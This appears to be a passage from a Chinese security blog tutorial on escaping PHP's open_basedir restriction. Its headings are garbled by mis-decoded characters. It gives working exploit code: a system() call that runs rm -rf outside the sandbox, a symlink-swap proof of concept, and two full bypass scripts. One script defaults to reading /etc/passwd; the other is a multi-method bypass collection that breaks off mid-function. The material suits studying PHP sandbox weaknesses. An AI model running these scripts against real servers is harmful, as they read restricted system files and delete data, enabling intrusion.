<h3 id="0X01-æ“ä½œæ–‡ä»¶"><a href="#0X01-æ“ä½œæ–‡ä»¶" class="headerlink" title="0X01 æ“ä½œæ–‡ä»¶"></a>0X01 æ“ä½œæ–‡ä»¶</h3><h5 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œå‡½æ•°</h5><ul>
<li><p>èƒŒæ™¯ï¼šç”±äºopen_basedirçš„è®¾ç½®å¯¹systemç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°æ˜¯æ— æ•ˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥è®¿é—®é™åˆ¶ç›®å½•</p>
</li>
<li><p>åˆ©ç”¨</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªç›®å½•testï¼Œå¹¶æ–°å»º1.txtï¼Œå†…å®¹ä¸ºâ€abcâ€œï¼š<code>mkdir /home/tomas/test &amp;&amp; cd /home/tomas/test &amp;&amp; echo &quot;abc&quot; &gt; 1.txt</code></li>
<li>åœ¨testç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç›®å½•bï¼Œæ–°å»ºä¸€ä¸ª1.phpï¼Œå¹¶å†™å…¥phpä»£ç ï¼š<code>mkdir b &amp;&amp; vi 1.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">echo</span> file_get_contents(<span class="string">"../1.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>åœ¨php.iniä¸­è®¾ç½®open_basedirï¼š<code>open_basedir = /home/tomas/test/b</code></p>
</li>
<li><p>æ‰§è¡Œ1.phpï¼Œå‘ç°é™åˆ¶äº†è®¿é—®</p>
</li>
<li><p>ä¿®æ”¹1.phpçš„æ–‡ä»¶å†…å®¹ä¸º</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="string">"rm -rf ../1.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å†æ¬¡æ‰§è¡Œ1.phpï¼Œå‘ç°å¯ä»¥ç»•è¿‡open_basediræ¥åˆ é™¤æ–‡ä»¶</li>
</ul>
</li>
<li><p>â–² ç”±äºå‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸€èˆ¬éƒ½ä¼šè¢«é™åˆ¶åœ¨disable_functionå½“ä¸­ï¼Œæ‰€ä»¥éœ€è¦å¯»æ‰¾å…¶ä»–é€”å¾„æ¥ç»•è¿‡é™åˆ¶</p>
</li>
</ul>
<p><img src="/images/php-about/open-base-dir/system-open-basedir-execution.png" alt="system-open-basedir-execution"></p>
<h5 id="symlink-å‡½æ•°"><a href="#symlink-å‡½æ•°" class="headerlink" title="symlink()å‡½æ•°"></a>symlink()å‡½æ•°</h5><ul>
<li><p>å‰æçŸ¥è¯†</p>
<ul>
<li>ç¬¦å·é“¾æ¥åˆå«è½¯é“¾æ¥,æ˜¯ä¸€ç±»ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åŒ…å«äº†å¦ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„å(ç»å¯¹è·¯å¾„æˆ–è€…ç›¸å¯¹è·¯å¾„)ã€‚è·¯å¾„å¯ä»¥æ˜¯ä»»æ„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¯ä»¥é“¾æ¥ä¸åŒæ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ã€‚åœ¨å¯¹ç¬¦å·æ–‡ä»¶è¿›è¡Œè¯»æˆ–å†™æ“ä½œçš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æŠŠè¯¥æ“ä½œè½¬æ¢ä¸ºå¯¹æºæ–‡ä»¶çš„æ“ä½œï¼Œä½†åˆ é™¤é“¾æ¥æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿä»…ä»…åˆ é™¤é“¾æ¥æ–‡ä»¶ï¼Œè€Œä¸åˆ é™¤æºæ–‡ä»¶æœ¬èº«</li>
</ul>
</li>
<li><p>åˆ©ç”¨</p>
<ul>
<li>åœ¨/var/www/htmlä¸‹æ–°å»ºä¸€ä¸ª1.php</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        mkdir(<span class="string">"c"</span>);</span><br><span class="line">        chdir(<span class="string">"c"</span>);</span><br><span class="line">        mkdir(<span class="string">"d"</span>);</span><br><span class="line">        chdir(<span class="string">"d"</span>);</span><br><span class="line">        chdir(<span class="string">".."</span>);</span><br><span class="line">        chdir(<span class="string">".."</span>);</span><br><span class="line">        symlink(<span class="string">"c/d"</span>,<span class="string">"tmplink"</span>);</span><br><span class="line">        symlink(<span class="string">"tmplink/../../1.txt"</span>,<span class="string">"exploit"</span>);</span><br><span class="line">        unlink(<span class="string">"tmplink"</span>);</span><br><span class="line">        mkdir(<span class="string">"tmplink"</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_put_contents(<span class="string">"http://127.0.0.1/exploit"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨/var/wwwä¸­æ–°å»ºä¸€ä¸ª1.txtï¼Œå†…å®¹ä¸ºâ€abcâ€</li>
<li>è®¾ç½®open_basedirï¼š<code>open_basedir=/var/www/html/</code></li>
<li>åœ¨/var/www/htmlä¸‹æ–°å»ºtest.phpæµ‹è¯•ï¼Œå‘ç°è®¿é—®å—é™</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">          file_get_contents(&quot;../1.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ‰§è¡Œåˆšæ‰çš„è„šæœ¬1.phpï¼Œå‘ç°æˆåŠŸæ‰§è¡Œï¼Œé€ƒè„±äº†open_basedirçš„é™åˆ¶</li>
</ul>
<p><img src="/images/php-about/open-base-dir/symlink-open-basedir-execution.png" alt="symlink-open-basedir-execution"></p>
</li>
<li><p>åˆ†æ</p>
<ul>
<li><code>symlink(&quot;tmplink/../../1.txt&quot;,&quot;exploit&quot;);</code><ul>
<li>tmplinkåªæ˜¯ä¸ªç¬¦å·é“¾æ¥æ–‡ä»¶</li>
<li>è·¯å¾„ä¿®æ”¹ä¸ºï¼šc/d/../../1.txt</li>
<li>ç”±äºè·¯å¾„åœ¨open_basedirèŒƒå›´å†…ï¼Œæ‰€ä»¥exploitå»ºç«‹æˆåŠŸ</li>
</ul>
</li>
<li>åˆ é™¤tmplinkç¬¦å·é“¾æ¥æ–‡ä»¶å†æ–°å»ºä¸€ä¸ªåŒåä¸ºtmplinkçš„æ–‡ä»¶å¤¹<ul>
<li>exploitæŒ‡å‘è·¯å¾„ä¸ºtmplink/../../</li>
<li>tmplinkå˜æˆäº†çœŸå®å­˜åœ¨çš„æ–‡ä»¶å¤¹ä¸”æŒ‡å‘äº†1.txtæ‰€åœ¨çš„ç›®å½•å³/var/www</li>
</ul>
</li>
<li>å†è®¿é—®ç¬¦å·é“¾æ¥æ–‡ä»¶exploitå³å¯ä»¥è¯»å–åˆ°1.txtçš„æ–‡ä»¶å†…å®¹</li>
</ul>
</li>
</ul>
<h3 id="0X03-PHP-FPM-FastCGI-bypass-open-basedir"><a href="#0X03-PHP-FPM-FastCGI-bypass-open-basedir" class="headerlink" title="0X03 PHP-FPM/FastCGI bypass open_basedir"></a>0X03 PHP-FPM/FastCGI bypass open_basedir</h3><ul>
<li>â–² åŸºäºPHP-FPMçš„æœªæˆæƒèŒƒå›´æ¼æ´ï¼Œå¯è‡ªå®šä¹‰ä»»æ„ä»£ç æ‰§è¡Œã€</li>
<li>å‰æ<ul>
<li>tcpç›‘å¬æ–¹å¼ï¼Œç›‘å¬æ–¹å¼ä¸º0.0.0.0:9000</li>
<li>phpç»“åˆçš„æ–¹å¼ä¸ºfpm/FastCGI</li>
</ul>
</li>
<li>æ„é€ Pç‰›çš„è„šæœ¬ <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">fpm.pyå…¼å®¹py3å’Œpy2</a></li>
</ul>
<p><img src="/images/php-about/disable_function/php-fpm-bypass.png" alt="php-fpm-bypass"></p>
<h3 id="0X04-è¯»å–æ–‡ä»¶è„šæœ¬"><a href="#0X04-è¯»å–æ–‡ä»¶è„šæœ¬" class="headerlink" title="0X04 è¯»å–æ–‡ä»¶è„šæœ¬"></a>0X04 è¯»å–æ–‡ä»¶è„šæœ¬</h3><h5 id="æ¥è‡ªPç‰›çš„è„šæœ¬"><a href="#æ¥è‡ªPç‰›çš„è„šæœ¬" class="headerlink" title="æ¥è‡ªPç‰›çš„è„šæœ¬"></a>æ¥è‡ªPç‰›çš„è„šæœ¬</h5><ul>
<li>ä»£ç </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* by phithon</span></span><br><span class="line"><span class="comment">* From https://www.leavesongs.com</span></span><br><span class="line"><span class="comment">* detail: http://cxsecurity.com/issue/WLB-2009110068</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">'content-type: text/plain'</span>);</span><br><span class="line">error_reporting(<span class="number">-1</span>);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">printf(<span class="string">"open_basedir: %s\nphp_version: %s\n"</span>, ini_get(<span class="string">'open_basedir'</span>), phpversion());</span><br><span class="line">printf(<span class="string">"disable_functions: %s\n"</span>, ini_get(<span class="string">'disable_functions'</span>));</span><br><span class="line">$file = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, <span class="keyword">isset</span>($_REQUEST[<span class="string">'file'</span>]) ? $_REQUEST[<span class="string">'file'</span>] : <span class="string">'/etc/passwd'</span>);</span><br><span class="line">$relat_file = getRelativePath(<span class="keyword">__FILE__</span>, $file);</span><br><span class="line">$paths = explode(<span class="string">'/'</span>, $file);</span><br><span class="line">$name = mt_rand() % <span class="number">999</span>;</span><br><span class="line">$exp = getRandStr();</span><br><span class="line">mkdir($name);</span><br><span class="line">chdir($name);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span> ; $i &lt; count($paths) - <span class="number">1</span> ; $i++)&#123;</span><br><span class="line">    mkdir($paths[$i]);</span><br><span class="line">    chdir($paths[$i]);</span><br><span class="line">&#125;</span><br><span class="line">mkdir($paths[$i]);</span><br><span class="line"><span class="keyword">for</span> ($i -= <span class="number">1</span>; $i &gt; <span class="number">0</span>; $i--) &#123; </span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$paths = explode(<span class="string">'/'</span>, $relat_file);</span><br><span class="line">$j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $paths[$i] == <span class="string">'..'</span>; $i++) &#123; </span><br><span class="line">    mkdir($name);</span><br><span class="line">    chdir($name);</span><br><span class="line">    $j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= $j; $i++) &#123; </span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$tmp = array_fill(<span class="number">0</span>, $j + <span class="number">1</span>, $name);</span><br><span class="line">symlink(implode(<span class="string">'/'</span>, $tmp), <span class="string">'tmplink'</span>);</span><br><span class="line">$tmp = array_fill(<span class="number">0</span>, $j, <span class="string">'..'</span>);</span><br><span class="line">symlink(<span class="string">'tmplink/'</span> . implode(<span class="string">'/'</span>, $tmp) . $file, $exp);</span><br><span class="line">unlink(<span class="string">'tmplink'</span>);</span><br><span class="line">mkdir(<span class="string">'tmplink'</span>);</span><br><span class="line">delfile($name);</span><br><span class="line">$exp = dirname($_SERVER[<span class="string">'SCRIPT_NAME'</span>]) . <span class="string">"/&#123;$exp&#125;"</span>;</span><br><span class="line">$exp = <span class="string">"http://&#123;$_SERVER['SERVER_NAME']&#125;&#123;$exp&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n-----------------content---------------\n\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($exp);</span><br><span class="line">delfile(<span class="string">'tmplink'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span><span class="params">($from, $to)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">  $from = rtrim($from, <span class="string">'\/'</span>) . <span class="string">'/'</span>;</span><br><span class="line">  $from = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $from);</span><br><span class="line">  $to   = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $to);</span><br><span class="line"></span><br><span class="line">  $from   = explode(<span class="string">'/'</span>, $from);</span><br><span class="line">  $to     = explode(<span class="string">'/'</span>, $to);</span><br><span class="line">  $relPath  = $to;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span>($from <span class="keyword">as</span> $depth =&gt; $dir) &#123;</span><br><span class="line">    <span class="comment">// find first non-matching dir</span></span><br><span class="line">    <span class="keyword">if</span>($dir === $to[$depth]) &#123;</span><br><span class="line">      <span class="comment">// ignore this directory</span></span><br><span class="line">      array_shift($relPath);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">      $remaining = count($from) - $depth;</span><br><span class="line">      <span class="keyword">if</span>($remaining &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">        $padLength = (count($relPath) + $remaining - <span class="number">1</span>) * <span class="number">-1</span>;</span><br><span class="line">        $relPath = array_pad($relPath, $padLength, <span class="string">'..'</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $relPath[<span class="number">0</span>] = <span class="string">'./'</span> . $relPath[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> implode(<span class="string">'/'</span>, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delfile</span><span class="params">($deldir)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (@is_file($deldir)) &#123;</span><br><span class="line">        @chmod($deldir,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @unlink($deldir);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(@is_dir($deldir))&#123;</span><br><span class="line">        <span class="keyword">if</span>(($mydir = @opendir($deldir)) == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">false</span> !== ($file = @readdir($mydir)))</span><br><span class="line">        &#123;</span><br><span class="line">            $name = File_Str($deldir.<span class="string">'/'</span>.$file);</span><br><span class="line">            <span class="keyword">if</span>(($file!=<span class="string">'.'</span>) &amp;&amp; ($file!=<span class="string">'..'</span>))&#123;delfile($name);&#125;</span><br><span class="line">        &#125; </span><br><span class="line">        @closedir($mydir);</span><br><span class="line">        @chmod($deldir,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @rmdir($deldir) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">File_Str</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'//'</span>,<span class="string">'/'</span>,str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,$string));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span><span class="params">($length = <span class="number">6</span>)</span> </span>&#123;</span><br><span class="line">    $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $randStr = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randStr .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/php-script-p.png" alt="php-script-p"></p>
<h5 id="æ¥è‡ªniexinmingå¸ˆå‚…çš„è„šæœ¬"><a href="#æ¥è‡ªniexinmingå¸ˆå‚…çš„è„šæœ¬" class="headerlink" title="æ¥è‡ªniexinmingå¸ˆå‚…çš„è„šæœ¬"></a>æ¥è‡ªniexinmingå¸ˆå‚…çš„è„šæœ¬</h5><ul>
<li>ä»£ç </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PHP open_basedir bypass collection</span></span><br><span class="line"><span class="comment">Works with &gt;= PHP5</span></span><br><span class="line"><span class="comment">By /fd, <span class="doctag">@filedescriptor</span>(https://twitter.com/filedescriptor)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Assistant functions</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span><span class="params">($from, $to)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">	$from = rtrim($from, <span class="string">'\/'</span>) . <span class="string">'/'</span>;</span><br><span class="line">	$from = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $from);</span><br><span class="line">	$to = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $to);</span><br><span class="line"> </span><br><span class="line">	$from = explode(<span class="string">'/'</span>, $from);</span><br><span class="line">	$to = explode(<span class="string">'/'</span>, $to);</span><br><span class="line">	$relPath = $to;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">foreach</span> ($from <span class="keyword">as</span> $depth =&gt; $dir) &#123;</span><br><span class="line">		<span class="comment">// find first non-matching dir</span></span><br><span class="line">		<span class="keyword">if</span> ($dir === $to[$depth]) &#123;</span><br><span class="line">			<span class="comment">// ignore this directory</span></span><br><span class="line">			array_shift($relPath);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">			$remaining = count($from) - $depth;</span><br><span class="line">			<span class="keyword">if</span> ($remaining &gt; <span class="number">1</span>) &#123;</span><br><span class="line">				<span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">				$padLength = (count($relPath) + $remaining - <span class="number">1</span>) * <span class="number">-1</span>;</span><br><span class="line">				$relPath = array_pad($relPath, $padLength, <span class="string">'..'</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$relPath[<span class="number">0</span>] = <span class="string">'./'</span> . $relPath[<span class="number">0</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> implode(<span class="string">'/'</span>, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fallback</span><span class="params">($classes)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">		$object = <span class="keyword">new</span> $class;</span><br><span class="line">		<span class="keyword">if</span> ($object-&gt;isAvailable()) &#123;</span><br><span class="line">			<span class="keyword">return</span> $object;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> NoExploit;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Core classes</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoExploit</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'No exploit is available.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">DirectoryLister</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $currentPath;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setCurrentPath</span><span class="params">($currentPath)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;currentPath = $currentPath;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getCurrentPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;currentPath;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GlobWrapperDirectoryLister</span> <span class="keyword">extends</span> <span class="title">DirectoryLister</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> stripos(PHP_OS, <span class="string">'win'</span>) === <span class="keyword">FALSE</span> &amp;&amp; in_array(<span class="string">'glob'</span>, stream_get_wrappers());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Directory listing via glob pattern'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$file_list = <span class="keyword">array</span>();</span><br><span class="line">		<span class="comment">// normal files</span></span><br><span class="line">		$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://&#123;$this-&gt;getCurrentPath()&#125;*"</span>);</span><br><span class="line">		<span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">			$file_list[] = $f-&gt;__toString();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">		$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://&#123;$this-&gt;getCurrentPath()&#125;.*"</span>);</span><br><span class="line">		<span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">			$file_list[] = $f-&gt;__toString();</span><br><span class="line">		&#125;</span><br><span class="line">		sort($file_list);</span><br><span class="line">		<span class="keyword">return</span> $file_list;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealpathBruteForceDirectoryLister</span> <span class="keyword">extends</span> <span class="title">DirectoryLister</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $characters = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789-_'</span></span><br><span class="line">	, $extension = <span class="keyword">array</span>()</span><br><span class="line">	, $charactersLength = <span class="number">38</span></span><br><span class="line">	, $maxlength = <span class="number">3</span></span><br><span class="line">	, $fileList = <span class="keyword">array</span>();</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> ini_get(<span class="string">'open_basedir'</span>) &amp;&amp; function_exists(<span class="string">'realpath'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Directory listing via brute force searching with realpath function.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setCharacters</span><span class="params">($characters)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;characters = $characters;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;charactersLength = count($characters);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setExtension</span><span class="params">($extension)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;extension = $extension;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setMaxlength</span><span class="params">($maxlength)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;maxlength = $maxlength;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		set_time_limit(<span class="number">0</span>);</span><br><span class="line">		set_error_handler(<span class="keyword">array</span>(<span class="keyword">__CLASS__</span>, <span class="string">'handler'</span>));</span><br><span class="line">		$number_set = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">while</span> (count($number_set = <span class="keyword">$this</span>-&gt;nextCombination($number_set, <span class="number">0</span>)) &lt;= <span class="keyword">$this</span>-&gt;maxlength) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;searchFile($number_set);</span><br><span class="line">		&#125;</span><br><span class="line">		sort(<span class="keyword">$this</span>-&gt;fileList);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fileList;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">nextCombination</span><span class="params">($number_set, $length)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">isset</span>($number_set[$length])) &#123;</span><br><span class="line">			$number_set[$length] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">return</span> $number_set;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($number_set[$length] + <span class="number">1</span> === <span class="keyword">$this</span>-&gt;charactersLength) &#123;</span><br><span class="line">			$number_set[$length] = <span class="number">0</span>;</span><br><span class="line">			$number_set = <span class="keyword">$this</span>-&gt;nextCombination($number_set, $length + <span class="number">1</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$number_set[$length]++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $number_set;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">searchFile</span><span class="params">($number_set)</span> </span>&#123;</span><br><span class="line">		$file_name = <span class="string">'a'</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($number_set <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">			$file_name[$key] = <span class="keyword">$this</span>-&gt;characters[$value];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// normal files</span></span><br><span class="line">		realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . $file_name);</span><br><span class="line">		<span class="comment">// files with preceeding dot</span></span><br><span class="line">		realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . <span class="string">'.'</span> . $file_name);</span><br><span class="line">		<span class="comment">// files with extension</span></span><br><span class="line">		<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;extension <span class="keyword">as</span> $extension) &#123;</span><br><span class="line">			realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . $file_name . $extension);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> 